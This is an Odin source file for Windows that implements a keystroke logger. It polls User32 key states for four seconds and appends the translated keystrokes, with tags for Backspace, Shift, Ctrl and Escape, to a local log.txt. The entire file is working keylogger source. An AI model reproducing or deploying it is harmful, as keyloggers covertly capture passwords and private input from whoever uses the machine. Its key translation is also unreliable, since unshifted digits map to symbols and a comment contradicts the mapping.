package main

import "core:c"
import "core:os"
import "core:path/filepath"
import "core:time"

INT :: c.int
SHORT :: c.short

VK_TAB :: 0x09
VK_RETURN :: 0x0D
VK_SPACE :: 0x20
VK_ESCAPE :: 0x1B
VK_BACK :: 0x08
VK_SHIFT :: 0x10
VK_CONTROL :: 0x11
VK_CAPITAL :: 0x14

foreign import user32 "system:User32.lib"

@(default_calling_convention = "system")
foreign user32 {
	GetKeyState :: proc(nVirtKey: INT) -> SHORT ---
	GetAsyncKeyState :: proc(vKey: INT) -> SHORT ---
}

translate_key :: proc(vk_code: rune) -> rune {
	shift := (GetAsyncKeyState(VK_SHIFT) & -0x8000) != 0
	caps := (GetKeyState(VK_CAPITAL) & 0x0001) != 0

	// A..=Z or a..=z
	if 'A' <= vk_code && vk_code <= 'Z' {
		if (caps && !shift) || (!caps && shift) {
			return vk_code // A..=Z
		} else {
			return rune(byte(vk_code) + (byte('a') - byte('A'))) // a..=z
		}
	}

	// 1..=9 or !"#$%&'()
	if '1' <= vk_code && vk_code <= '9' {
		if caps && !shift {
			return vk_code
		} else {
			switch vk_code {
			case '1':
				return '!'
			case '2':
				return '@'
			case '3':
				return '#'
			case '4':
				return '$'
			case '5':
				return '%'
			case '6':
				return '&'
			case '7':
				return '\''
			case '8':
				return '('
			case '9':
				return ')'
			}
		}
	}

	// More special keys
	switch vk_code {
	case VK_SPACE:
		return ' '
	case VK_RETURN:
		return '\n'
	case VK_TAB:
		return '\t'

	}

	return '\x00'
}

main :: proc() {
	log_path := filepath.join_non_empty([]string{os.get_current_directory(), "log.txt"})

	f, err := os.open(log_path, os.O_CREATE | os.O_APPEND)
	if err != os.ERROR_NONE {
		panic("os.open failed")
	}
	defer os.close(f)

	start := time.tick_now()

	for time.tick_since(start) < (time.Second * 4) {
		time.sleep(time.Millisecond * 10)

		for key in rune(8) ..= rune(255) {
			if (GetAsyncKeyState(i32(key)) & 0x0001) != 0 {
				// Skip unnecessary keys
				if GetAsyncKeyState(i32(key)) == 0 {
					continue
				}

				ch := translate_key(key)
				if ch != '\x00' {
					os.write_rune(f, ch)
				} else {
					switch SHORT(key) {
					case VK_BACK:
						os.write_string(f, "[BACK]")
					case VK_SHIFT:
						os.write_string(f, "[SHIFT]")
					case VK_CONTROL:
						os.write_string(f, "[CTRL]")
					case VK_ESCAPE:
						os.write_string(f, "[ESC]")
					}
				}

			}
		}

	}
}
